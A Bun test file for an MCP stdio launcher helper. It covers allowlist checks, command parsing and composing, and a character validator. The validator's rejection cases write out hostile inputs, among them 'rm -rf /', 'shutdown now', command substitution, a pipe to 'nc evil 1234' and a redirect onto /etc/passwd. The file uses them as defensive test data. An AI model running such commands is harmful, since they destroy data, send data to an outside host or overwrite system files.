import { describe, expect, test } from "bun:test";
import {
  composeStdioCommand,
  DEFAULT_MCP_STDIO_LAUNCHER,
  hasSafeStdioCommandChars,
  isMcpStdioLauncher,
  MCP_STDIO_LAUNCHERS,
  parseStdioCommand,
  stdioCommandLauncher,
} from "@/lib/mcp-launchers";

describe("MCP stdio launchers", () => {
  test("allowlist is bunx + uvx, default bunx", () => {
    expect([...MCP_STDIO_LAUNCHERS]).toEqual(["bunx", "uvx"]);
    expect(DEFAULT_MCP_STDIO_LAUNCHER).toBe("bunx");
  });

  test("isMcpStdioLauncher accepts only the allowlist", () => {
    expect(isMcpStdioLauncher("bunx")).toBe(true);
    expect(isMcpStdioLauncher("uvx")).toBe(true);
    expect(isMcpStdioLauncher("npx")).toBe(false);
    expect(isMcpStdioLauncher("node")).toBe(false);
    expect(isMcpStdioLauncher("")).toBe(false);
  });

  test("stdioCommandLauncher returns the first token", () => {
    expect(stdioCommandLauncher("bunx -y @scope/srv")).toBe("bunx");
    expect(stdioCommandLauncher("  uvx   mcp-server-time ")).toBe("uvx");
    expect(stdioCommandLauncher("")).toBe("");
  });

  test("parseStdioCommand splits a known launcher + args", () => {
    expect(
      parseStdioCommand("bunx -y @modelcontextprotocol/server-foo"),
    ).toEqual({
      launcher: "bunx",
      args: "-y @modelcontextprotocol/server-foo",
    });
    expect(parseStdioCommand("uvx mcp-server-time")).toEqual({
      launcher: "uvx",
      args: "mcp-server-time",
    });
  });

  test("parseStdioCommand maps npx → bunx (drop-in replacement)", () => {
    expect(parseStdioCommand("npx -y @scope/srv")).toEqual({
      launcher: "bunx",
      args: "-y @scope/srv",
    });
  });

  test("parseStdioCommand falls back to the default launcher on an unknown first token", () => {
    expect(parseStdioCommand("node server.js --port 3")).toEqual({
      launcher: "bunx",
      args: "server.js --port 3",
    });
  });

  test("composeStdioCommand joins + trims", () => {
    expect(composeStdioCommand("bunx", "-y @scope/srv")).toBe(
      "bunx -y @scope/srv",
    );
    expect(composeStdioCommand("uvx", "")).toBe("uvx");
  });

  test("parse ∘ compose round-trips a launcher+args command", () => {
    const cmd = "bunx -p hostinger-api-mcp@latest hostinger-hosting-mcp";
    const { launcher, args } = parseStdioCommand(cmd);
    expect(composeStdioCommand(launcher, args)).toBe(cmd);
  });

  test("hasSafeStdioCommandChars accepts real launcher commands", () => {
    expect(
      hasSafeStdioCommandChars("bunx @modelcontextprotocol/server-everything"),
    ).toBe(true);
    expect(hasSafeStdioCommandChars("uvx mcp-server-time")).toBe(true);
    expect(
      hasSafeStdioCommandChars(
        "bunx -p hostinger-api-mcp@latest hostinger-hosting-mcp",
      ),
    ).toBe(true);
    expect(
      hasSafeStdioCommandChars("uvx --from package mcp --local-timezone=UTC"),
    ).toBe(true);
  });

  test("hasSafeStdioCommandChars rejects shell metacharacters + control chars", () => {
    expect(hasSafeStdioCommandChars("bunx; shutdown now")).toBe(false);
    expect(hasSafeStdioCommandChars("bunx && rm -rf /")).toBe(false);
    expect(hasSafeStdioCommandChars("bunx $(whoami)")).toBe(false);
    expect(hasSafeStdioCommandChars("bunx `id`")).toBe(false);
    expect(hasSafeStdioCommandChars("bunx pkg | nc evil 1234")).toBe(false);
    expect(hasSafeStdioCommandChars("bunx pkg > /etc/passwd")).toBe(false);
    expect(hasSafeStdioCommandChars("")).toBe(false);
    expect(hasSafeStdioCommandChars(`bunx ${"a".repeat(600)}`)).toBe(false);
  });
});
